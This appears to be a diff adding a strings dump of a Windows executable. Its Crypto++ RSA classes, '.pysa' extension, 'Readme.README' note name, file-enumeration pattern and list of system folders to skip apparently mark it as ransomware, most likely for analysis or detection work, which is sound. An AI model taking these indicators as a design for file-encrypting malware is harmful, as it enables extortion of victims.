+.?AVBERSequenceDecoder@CryptoPP@@
+.?AVBERGeneralDecoder@CryptoPP@@
+.?AVDERSequenceEncoder@CryptoPP@@
+.?AVDERGeneralEncoder@CryptoPP@@
+.?AVByteQueue@CryptoPP@@
+.?AV?$Bufferless@VBufferedTransformation@CryptoPP@@@CryptoPP@@
+.?AV?$EuclideanDomainOf@VInteger@CryptoPP@@@CryptoPP@@
+.?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@
+.?AVAlgorithmParameters@CryptoPP@@
+.?AVArrayXorSink@CryptoPP@@
+.?AVHashInputTooLong@CryptoPP@@
+.?AVWalker@ByteQueue@CryptoPP@@
+.PAVRSAFunction@CryptoPP@@
+.?AV?$AlgorithmParametersTemplate@PBE@CryptoPP@@
+.?AVOS_RNG_Err@CryptoPP@@
+.?AVNonblockingRng@CryptoPP@@
+.?AVMessageQueue@CryptoPP@@
+.?AV?$AutoSignaling@VBufferedTransformation@CryptoPP@@@CryptoPP@@
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AV_Locimp@locale@std@@
+.?AVtype_info@@
+.?AVbad_array_new_length@std@@
+.?AVbad_exception@std@@
+.?AVDNameNode@@
+.?AVcharNode@@
+.?AVpcharNode@@
+.?AVpDNameNode@@
+.?AVDNameStatusNode@@
+.?AVpairNode@@
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+0'050?0V0Z0d0u0
+1#1/1A1K1Q1[1e1
+212;2A2K2U2q2
+3!313=3B3H3R3\3g3
+4!4+414;4E4a4q4{4
+5!5+555Q5a5k5q5{5
+6%6A6Q6]6b6h6r6|6
+717A7K7Q7[7e7
+818A8K8Q8[8e8
+9!919;9A9K9U9q9}9
+:$:0:::\:}:
+;";V;p;z;
+33383w3
+4$444j4
+5;5c5l5
+6 8A8H8r8y8
+99&9R9t9
+:6:e:t:A;
+=1=8=v=
+>/?8?F?
+ 0=0O0a0
+01/1>1d1o1
+242D2S2r2
+3'3I3y3
+4#474a4w4
+5$5:5I5`5~5
+697V7~7
+8G9S9_9
+;;;G;^;
+<&<c<l<|<
+=&=-=k=r=
+0D0R0_0
+1/1N1Z1w1
+737@7Y7
+979<9h9
+;&<0<O<Y<
+<T>e>j>z>
+3%3>3F3S3\3b3
+434=4d4z4
+5#5=5O5
+5%6G6Q6
+909F9X9j9|9
+=1>g>q>
+01191y1
+0E1X1g1q1{1
+2%2/292C2J2Q2X2_2f2m2t2{2
+6&606:6D6[6b6y6
+7:8I8k8m9
+0$030:0[0q0
+0C1V1a1g1{1
+3$3e3~3
+:6<F<6=F=
+2$2<2_2
+2#363E3x3
+6'6f6m6
+607V7d7
+0,0F0U0t0{0
+3E4a4f4
+8'888>8B8L8Y8
+9%9j9q9
+?&?2?J?R?_?m?u?
+1,2F2U2
+2C3N3v3
+:,;1;D;
+#262E2b2
+4:4]4l4
+8:9A9><
+061E1d1
+23282X2
+3"4'4E4J4
+9<9n9!<
+0 1S2t3{3
+6<6C6Q6h6o6
+7#7:7O7Z7k7
+8$898V8]8n8
+9/9A9M9_9q9
+5 5'555<5H5Z5a5h5r5y5
+6"6)646;6R6g6q6x6
+77&737:7H7O7[7m7t7{7
+8)8;8B8I8W8^8j8q8
+>/>;>y>
+6'6E6T6{6
+8!9(9_9
+6f7%8N8
+<F<v<F=X=&>8>&?5?d?k?
+F0U0F1X1J2
+2F6X6V7h7
+304F4{4
+0:1N1h1
+384C4P4a4z4
+55'5-5;5\5Q6
+q2w2{2
+3 3&3*30343:3>3D3H3N3R3X3\3b3f3l3p3v3z3
+0&030_0
+556<6a6h6
+6C7V7e7
+<B=T=Z=
+2(2A2H2
+5#5W5^5
+5C6J6v7
+:!;0;e;l;
+4%4*4>4
+6,6G6|6
+8%8L8S8
+=+>N>]>
+1?1N1f1u1
+3&373Q3V3
+7!878c8
+889<9@9D9H9V9f9
+= =>=v=
+0-080K0Y0^0~0
+001V1h1
+3"353E3v3
+4%4=4E4R4`4h4n4|4
+8"8F8i8
+60E0&141
+969C9^9e9
+9f:x:$;O;Z;f;
+?2?9?P?
+1%1N1U1p1
+8I9f9x96?H?
+0.070|0
+081f1x1~1
+2"232:253m6r6C7
+<+=J=w=
+??I?b?j?z?
+0%0D0c0
+5X6`6f6u6
+6#7?7F7
+9@9F9L9T9Z9_9r9
+:':4:x:
+;T<a<v<~<
+<4=:=A=H=N=S=Y=_=e=j=p=v=|=
+>">(>.>4>9>?>E>K>P>V>\>b>g>m>s>y>~>
+??%?+?1?6?<?B?H?M?S?Y?_?d?j?p?v?{?
+0"0(0.03090?0E0J0P0V0\0a0g0m0s0x0~0
+1a2 3L3
+4)40464H4R4
+5;5H5N5]5d5i5r5w5
+6/696G6O6
+7'7,7M7S7j7
+99:H:W:|:
+<)<8<t<
+<+=O=f=n=
+(060Q0\0
+0<1K1R1
+5'5D5V5
+556T6^6o6}6
+8$80898>8D8N8X8h8x8
+9#9+969;9A9K9U9h9m9
+:>:d:m:s:{:
+5(6/64686<6@6
+f8j8n8r8v8z8~8
+829E9Y9e9
+:%:1:?:a:q:v:{:
+;;$;);P;\;a;f;
+<!<M<n<|<
+c0h0t0z0
+2*2a2h2r2w2
+5 6.6L6a6
+<1=v=)>
+3,4W4r4|4
+5D5i5n5z5
+9#:N:X:b:l:v:
+<"<X<\<`<d<h<l<
+?B?g?r?
+4.5[5g5|5
+5F6Z6`6
+8I9Q9j9
+9/:3:7:;:?:C:G:K:W:q:
+;;;L;{;
+2=3[3z3
+4O4d4w4
+4)535g5u5
+777I7X7i7
+9@9O9r9
+:!:G:e:u:
+;K;G<b<n<x<
+4%494L4
+6#6C6f6
+7*7S7`7y7
+;!;';2;8;F;
+<B<`<w<
+04090`0
+2"292B2w2
+3*3M3}3
+5!5'515A5H5
+556A6X7
+9/989c9Q:[:h:
+<-<<<J<V<b<p<
+>S?r?w?
+00151<1`1
+;,<6<R<
+=-=6=>=
+;#;=;P;j;
+;1<9<A<I<g<o<
+>8?N?d?m?x?
+1"1:1B1q1
+2A3I3o3
+6!757M7U7v7
+:+:2:8:S:Z:
+2(3C3N3a3
+10F0|1
+2!2%2)2-2
+7/73777;7?7C7G7K7O7S7W7[7
+4 5/5E5[5r5y5
+5)606B6O6a6i6s6|6
+8=8H8<:F:e:l:
+1,1?1r1
+3@7C8T8
+9(909H9m9{9
+;P;U;[;`;h;n;v;
+<$=/=9=H=P=X=
+7J7Z7(9
+;?;F;{;
+<-<6<C<M<o<
+>,>4>[>t>
+?)?F?Q?V?[?
+080B0^0i0n0s0
+1"1F1[1w1
+242?2D2I2j2z2
+323c3n3s3x3
+4M4X4e4z4
+5$525S5Z5p5
+7#7Y7|7
+;%<;<{<
+282U2w2
+:m;Z=a=
+0'1R1w1
+2I2U2a2m2
+233-4c4
+;#;0;B;I;S;d;#<b<
+4C4K4|4
+515=5S5\5e5
+989A9L9
+!0X0u0
+;<F<O=
+>6>@>Q>V>k>
+2(2<2G2^2
+2&3\3o3
+6E6P6]6n6|6
+<(<0<Y<`<w<
+= =J=]=g=
+>@?R?d?v?
+4+4=4y4>6E6M6U6]6
+=!>7>X>
+4525"6W6
+9$:u:5;*<t<f=
+> >7>|>$?y?
+858D8c8
+8$989U9
+0 1*1h1
+3%393E3Q3
+4"4s5+7K8
+=-?8?K?U?s?~?
+1:1#4h4D5
+6W7*?2?i?p?
+:%:,:3:
+<A=M=a=m=y=
+>/>?>K>Z>E?
+0-0K0_0e0
+:3:R:s:
+;0;[;~;
+<$=L=t=
+5<6Q6n6
+667A7^7
+;,<R<z<
+4"4B4b4
+555D5Q5U5Z5e5i5p5
+6!6&60656D6M6S6]6r6v6
+7!7&70757D7M7S7]7r7|7
+8#8-8B8F8R8b8r8
+9 9%949=9C9M9b9l9q9v9
+:2:6:B:L:Q:V:`:e:t:}:
+;";,;1;6;@;E;T;];c;m;
+< <%<4<=<C<M<b<f<s<
+=!=&=0=5=D=M=S=]=r=v=
+>#>->B>F>R>\>a>f>p>u>
+?"?&?2?<?A?F?P?U?d?m?s?}?
+0!0&00050D0M0S0]0r0v0
+1$1-131=1R1V1b1l1q1v1
+2 2$2(2,2024282<2@2D2H2L2P2T2X2\2`2d2h2l2p2t2x2|2
+8 8$8,8084888<8@8`8d8h8l8t8x8|8
+9 9$9(9,9x9|9
+:(;,;0;4;8;<;@;x;|;
+< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<`<d<h<l<p<t<x<|<
+= =$=(=,=0=4=8=<=@=D=H=L=P=T=X=\=`=d=h=l=p=t=x=|=
+> >$>(>,>0>4>8><>@>D>H>L>P>T>X>\>`>d>h>l>p>t>x>|>
+? ?$?(?,?0?4?8?<?@?D?H?L?P?T?X?\?`?d?h?l?p?t?x?|?
+0 0$0(0,0004080<0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+2p2t2x2
+3 3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
+4 4$4(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+5 5$5(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5l5p5t5x5|5
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6|6
+7 7$7(7,7074787<7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7
+8 8$8(8,8084888<8@8
+9 9$9(9,9094989<9@9D9H9L9P9T9X9\9`9d9h9l9p9t9x9|9
+:,:0:4:8:<:@:D:H:L:P:T:X:\:`:d:h:l:p:t:x:|:
+:p;t;x;|;
+;,<0<4<8<
+(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+5 5$5(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5l5p5t5x5|5
+5d6h6l6
+7 7$7(7,7074787<7@7D7H7L7d7h7l7
+: :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\:`:d:h:l:p:t:x:|:
+;@;D;H;L;P;T;X;\;`;d;h;l;p;t;x;|;
+< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<`<d<h<l<p<t<x<|<
+<4>8><>T>X>\>`>d>h>l>p>
+? ?$?(?,?0?4?8?<?@?D?H?L?P?T?X?\?`?d?h?l?p?t?x?|?
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(1,1014181`1d1h1l1p1t1x1|1
+3 3$3(3,3034383<3@3D3H3L3
+8 8$8(8,8084888<8@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8|8
+9 9$9(9,9094989<9@9D9H9L9P9T9X9\9`9d9h9l9p9t9x9|9
+9@?D?H?L?P?T?X?\?`?d?h?l?p?t?x?|?
+X0\0`0d0h0l0p0t0x0|0
+1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+5d<l<t<|<
+=$=,=4=<=D=L=T=\=d=l=t=|=
+>$>,>4><>D>L>T>\>d>l>t>|>
+1L5T5\5d5l5t5|5
+6$6,646<6D6L6T6\6d6l6t6|6
+7$7,747<7D7L7T7\7d7l7t7|7
+8$8,848<8D8L8T8\8d8l8t8|8
+9$9,949<9D9L9T9\9d9l9t9|9
+:$:,:4:<:D:L:T:\:d:l:t:|:
+;$;,;4;<;D;L;T;\;d;l;t;|;
+<$<,<4<<<D<L<T<\<d<h<p<x<
+= =(=0=8=@=H=P=X=`=h=p=x=
+> >(>0>8>@>H>P>X>`>h>p>x>
+? ?(?0?8?@?H?P?X?`?h?p?x?
+0 0(00080@0H0P0X0`0h0p0x0
+1 1(10181@1H1P1X1`1h1p1x1
+2 2(20282@2H2P2X2`2h2p2x2
+3 3(30383@3H3P3X3`3h3p3x3
+64787<7X7\7`7d7h7l7
+9 9$9(9,9094989<9@9D9H9L9P9T9X9\9`9d9h9l9p9t9x9|9
+<$<,<4<<<D<L<T<\<d<l<t<|<
+< >$>(>,>0>4>8><>@>D>H>L>P>T>X>\>`>d>h>l>
+7 7$7(7,7074787<7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7
+8 8$8(8,8084888<8@8D8H8L8P8
+:p;t;x;|;
+5$505<5H5T5`5l5x5
+6 6,686D6P6\6h6t6
+7(747@7L7X7d7p7|7
+8(848@8L8X8d8p8|8
+9<9D9L9T9\9d9l9t9|9
+:$:,:4:<:D:L:T:\:d:l:t:|:
+;$;,;4;<;D;L;T;\;d;l;t;|;
+<$<,<4<<<D<L<T<\<d<l<t<|<
+=$=,=4=<=D=L=T=\=d=l=t=|=
+>$>,>4><>D>L>T>\>d>l>t>|>
+?$?,?4?<?D?L?T?\?d?l?t?|?
+0$0,040<0D0L0T0X0`0h0p0x0
+1 1(10181@1H1P1X1`1h1p1x1
+2 2(20282@2H2P2X2`2h2p2x2
+3 3(30383@3H3P3X3`3h3p3x3
+4 4(40484@4H4P4X4`4h4p4x4
+5 5(50585@5H5P5X5`5h5p5x5
+6 6(60686@6H6P6X6`6h6p6x6
+7 7(70787@7H7P7X7`7h7p7
+3 383H3L3P3T3\3t3x3
+4,4<4@4P4T4X4\4d4|4
+5 5$5(5,5054585@5X5\5t5
+6 60646<6T6d6h6x6|6
+7 7(7@7D7\7`7x7|7
+8 8$8(8,80888P8T8l8|8
+9$94989H9L9P9X9p9
+: :0:4:8:<:D:\:l:p:x:
+; ;$;4;8;<;@;D;H;P;h;x;|;
+<$<(<,<0<4<<<T<d<h<l<t<
+=4=D=H=L=P=T=\=t=x=
+>$>(>8><>@>D>L>d>t>x>
+?,?0?8?P?`?d?h?l?t?
+0 0$0(000H0L0d0h0
+141D1H1X1\1`1d1h1p1
+242D2H2L2P2X2p2
+3,303H3L3d3t3x3
+4 4$4(404H4X4\4`4d4h4l4
+5 5$5(5,50585P5`5d5h5l5p5t5x5|5
+606@6D6H6L6P6T6X6\6`6d6h6l6t6
+7 787H7L7P7T7\7t7x7
+808@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8
+9 989H9L9P9T9X9\9`9d9h9l9p9t9x9|9
+:4:D:H:X:\:`:h:
+;(;,;0;4;8;<;@;H;`;d;|;
+<(<8<<<@<X<h<l<p<t<x<|<
+= =$=(=,=0=4=<=T=d=h=x=|=
+>4>D>H>X>\>l>p>t>x>|>
+?,?<?@?D?H?L?P?T?X?l?p?
+0 080H0L0P0T0X0\0`0d0h0l0
+1(1,10141<1T1d1h1p1
+2 2$2(2,20282P2`2d2h2l2p2t2x2|2
+3(3,30383P3`3d3t3x3|3
+4 4$4<4@4X4h4l4|4
+5,5<5@5D5H5L5P5T5X5`5x5
+6 6$686<6@6H6`6p6t6
+7(7,7074787<7@7D7H7L7P7X7p7t7
+8,8084888<8@8D8H8L8P8T8X8\8`8d8l8
+9 9$9(9,9094989<9@9D9L9d9t9x9|9
+:0:@:D:T:X:h:l:p:t:x:|:
+; ;0;4;D;H;X;\;`;d;h;l;p;t;x;|;
+<,<0<@<D<H<L<P<T<X<`<x<
+=$=(=,=0=4=8=<=@=D=H=P=h=x=|=
+>,>0>H>X>\>`>d>h>l>p>t>x>|>
+?$?<?L?P?`?d?h?l?p?t?x?|?
+0,000H0X0\0`0d0h0l0p0t0x0
+1 1$1,1D1T1X1h1l1p1x1
+2 282H2L2\2`2d2h2l2p2t2x2
+3 3$3(3,30383P3`3d3t3x3|3
+4$4(484<4@4D4H4P4h4x4|4
+5 5$5(5,5054585<5@5D5L5d5h5
+6 6$6(6,6064686L6P6`6d6h6l6p6t6x6|6
+7,7074787@7X7\7t7
+8 8$8(808H8L8d8t8x8|8
+9,90949<9T9d9h9l9p9x9
+: :(:@:D:\:l:p:t:x:|:
+;$;4;8;<;@;D;H;L;P;X;p;
+< <$<(<0<H<X<\<l<p<t<|<
+= =0=4=8=<=@=H=`=p=t=
+> >0>4>D>H>L>T>l>|>
+? ?$?4?8?H?L?\?`?d?h?l?p?t?|?
+0 080H0L0\0`0d0h0p0
+1,1<1@1P1T1\1t1
+2 2$2,2D2T2X2h2l2p2x2
+3(383<3L3P3T3\3t3
+3<;P;X;l;t;
+; <4<@<`<h<p<x<
+=$=0=P=\=|=
+>(>0><>h>
+?8?D?d?p?
+0(0H0T0t0|0
+1<1D1P1p1x1
+2,282X2h2p2|2
+3$3,343<3P3p3x3
+404P4X4`4h4p4x4
+5(505<5\5h5
+6 6(6H6\6h6p6
+7$7,7L7`7h7
+808<8\8d8x8
+9$909X9l9t9
+:$:D:P:
+;$;(;0;D;L;T;\;`;d;h;l;t;
+<$<,<4<8<<<D<L<T<X<\<`<h<|<
+=$=,=0=4=<=P=X=`=h=l=p=t=|=
+>@>T>\>d>l>t>
+?,?8?@?X?`?l?
+0(000<0`0
+1 1(141X1x1
+2@2H2`2h2p2|2
+3$3,343L3X3x3
+4 4P4\4|4
+545<5D5L5T5\5h5
+5 6@6H6`6h6p6x6
+7 7(7074787<7D7X7`7h7p7t7|7
+8,848<8D8P8t8
+9 9,9L9T9`9
+:$:0:d:
+;8;D;d;l;t;
+<,<8<X<d<
+= =@=h=p=x=
+>8>@>H>P>X>`>h>p>x>
+?<?H?h?p?x?
+0$0,080X0d0
+1$101P1X1`1h1p1x1
+1,242<2D2L2\2
+3$3,383X3`3l3
+4 4(4<4D4L4X4|4
+5$5,545<5H5h5p5|5
+6,6D6L6T6\6h6
+7$707P7X7|7
+8 8,8L8T8\8d8p8
+9$9,949<9H9h9p9x9|9
+:0:`:h:
+; ;(;0;<;\;d;l;x;
+<$<,<4<<<D<L<X<x<
+=,=8=X=`=h=l=p=x=
+> >@>H>T>t>|>
+?$?,?4?<?H?h?p?x?
+0(040<0\0
+101<1D1d1x1
+2$202X2l2|2
+343T3p3
+4$404P4\4|4
+5<5L5x5
+6 606\6d6
+7 7(7,70787L7T7`7
+808P8l8p8x8
+94989H9l9x9
+:(:H:h:t:
+;0;P;p;
+<8<X<x<
+=8=X=x=
+>8>X>x>
+?8?X?x?
+0<0@0t0
+0(1,1014181@1D1H1L1T1X1\1`1d1h1l1p1t1x1|1
+10343H3L3P3T3X3\3`3d3h3l3x3|3
+4 404@4P4h4t4x4|4
+4@5D5h:
+<$=D=h=
+> ?P?\?h?
+,0<0X0t0
+242T2x2
+3(4T4x4
+(0X0|0
+4D4h485(6 7
+:,;P;p;
+>0>@>d>
+2 3L3p3
+6,6L6l6
+7 787T7t7
+n.pysa
+%s\Readme.README
+.backupdb
+.avhdx
+.README
+.search-ms
+:\Windows\
+\Boot\
+\BOOTSECT
+\pagefile
+\System Volume Information\
+bootmgr
+\Recovery
+\Microsoft
+%s\*.*
+kernel32.dll
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+Fadvapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+         (((((                  H
+      (                          
+         (((((                  H
+(null)
+mscoree.dll
+DLC_ALL
+LC_COLLATE
+LC_CTYPE
+LC_MONETARY
+LC_NUMERIC
+LC_TIME
+Fapi-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+UTF-16LEUNICODE
+Famerican
+american english
+american-english
+australian
+belgian
+canadian
+chinese
+chinese-hongkong
+chinese-simplified
+chinese-singapore
+chinese-traditional
+dutch-belgian
+english-american
+english-aus
+english-belize
+english-can
+english-caribbean
+english-ire
+english-jamaica
+english-nz
+english-south africa
+english-trinidad y tobago
+english-uk
+english-us
+english-usa
+french-belgian
+french-canadian
+french-luxembourg
+french-swiss
+german-austrian
+german-lichtenstein
+german-luxembourg
+german-swiss
+irish-english
+italian-swiss
+norwegian
+norwegian-bokmal
+norwegian-nynorsk
+portuguese-brazilian
+spanish-argentina
+spanish-bolivia
+spanish-chile
+spanish-colombia
+spanish-costa rica
+spanish-dominican republic
+spanish-ecuador
+spanish-el salvador
+spanish-guatemala
+spanish-honduras
+spanish-mexican
+spanish-modern
+spanish-nicaragua
+spanish-panama
+spanish-paraguay
+spanish-peru
+spanish-puerto rico
+spanish-uruguay
+spanish-venezuela
+swedish-finland
+america
+britain
+england
+great britain
+holland
+hong-kong
+new-zealand
+pr china
+pr-china
+puerto-rico
+slovak
+south africa
+south korea
+south-africa
+south-korea
+trinidad & tobago
+united-kingdom
+united-states
+CONOUT$
